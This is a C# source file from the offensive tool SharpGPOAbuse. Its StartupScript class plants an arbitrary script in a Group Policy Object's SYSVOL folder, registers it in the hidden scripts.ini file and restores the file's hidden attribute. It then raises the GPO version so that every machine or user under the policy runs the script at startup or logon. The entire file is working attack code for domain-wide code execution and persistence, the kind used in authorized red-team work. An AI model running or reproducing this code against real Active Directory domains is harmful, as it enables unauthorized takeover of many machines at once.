using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace SharpGPOAbuse
{
    public class StartupScript
    {
        public static void NewStartupScript(string ScriptName, string ScriptContents, string Domain, string DomainController, string GPOName, string DistinguishedName, string objectType)
        {
            string hidden_ini;
            string GPOGuid = GroupPolicy.GetGPOGUID(DomainController, GPOName, DistinguishedName);

            string path = $@"\\{Domain}\\SysVol\\{Domain}\\Policies\\{GPOGuid}";
            string hidden_path = $@"\\{Domain}\\SysVol\\{Domain}\\Policies\\{GPOGuid}";

            if (objectType.Equals("Computer"))
            {
                hidden_ini = Environment.NewLine + "[Startup]" + Environment.NewLine + "0CmdLine=" + ScriptName + Environment.NewLine + "0Parameters=" + Environment.NewLine;
            }
            else
            {
                hidden_ini = Environment.NewLine + "[Logon]" + Environment.NewLine + "0CmdLine=" + ScriptName + Environment.NewLine + "0Parameters=" + Environment.NewLine;
            }

            string GPT_path = path + "\\GPT.ini";

            // Check if GPO path exists
            if (Directory.Exists(path) && objectType.Equals("Computer"))
            {
                path += "\\Machine\\Scripts\\Startup\\";
                hidden_path += "\\Machine\\Scripts\\scripts.ini";
            }
            else if (Directory.Exists(path) && objectType.Equals("User"))
            {
                path += "\\User\\Scripts\\Logon\\";
                hidden_path += "\\User\\Scripts\\scripts.ini";
            }
            else
            {
                Console.Error.WriteLine("[!] Could not find the specified GPO.");
                return;
            }

            // check if the folder structure for adding admin user exists in SYSVOL
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            path += ScriptName;
            if (File.Exists(path))
            {
                Console.Error.WriteLine("[!] A Startup script with the same name already exists. Choose a different name.");
                return;
            }

            if (File.Exists(hidden_path))
            {
                // Remove the hidden attribute of the file
                var attributes = File.GetAttributes(hidden_path);
                if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
                {
                    attributes &= ~FileAttributes.Hidden;
                    File.SetAttributes(hidden_path, attributes);
                }

                string line;
                List<string> new_list = new List<string>();
                using (StreamReader file = new StreamReader(hidden_path))
                {
                    while ((line = file.ReadLine()) != null)
                    {
                        new_list.Add(line);
                    }
                }

                List<int> first_element = new List<int>();

                string q = "";
                foreach (string item in new_list)
                {
                    try
                    {
                        q = Regex.Replace(item[0].ToString(), "[^0-9]", "");
                        first_element.Add(Int32.Parse(q));
                    }
                    catch { continue; }

                }

                int max = first_element.Max() + 1;
                new_list.Add(hidden_ini = max.ToString() + "CmdLine=" + ScriptName + Environment.NewLine + max.ToString() + "Parameters=");

                using (StreamWriter file2 = new StreamWriter(hidden_path))
                {
                    foreach (string l in new_list)
                    {
                        file2.WriteLine(l);
                    }
                }

                //Add the hidden attribute of the file
                File.SetAttributes(hidden_path, File.GetAttributes(hidden_path) | FileAttributes.Hidden);
            }

            else
            {
                File.WriteAllText(hidden_path, hidden_ini);
                //Add the hidden attribute of the file
                var attributes = File.GetAttributes(hidden_path);
                File.SetAttributes(hidden_path, File.GetAttributes(hidden_path) | FileAttributes.Hidden);
            }

            Console.WriteLine("[+] Creating new startup script...");
            File.WriteAllText(path, ScriptContents);

            if (objectType.Equals("Computer"))
            {
                GroupPolicy.UpdateVersion(Domain, DistinguishedName, GPOName, GPT_path, "NewStartupScript", "Computer");
            }
            else
            {
                GroupPolicy.UpdateVersion(Domain, DistinguishedName, GPOName, GPT_path, "NewStartupScript", "User");
            }
        }
    }
}
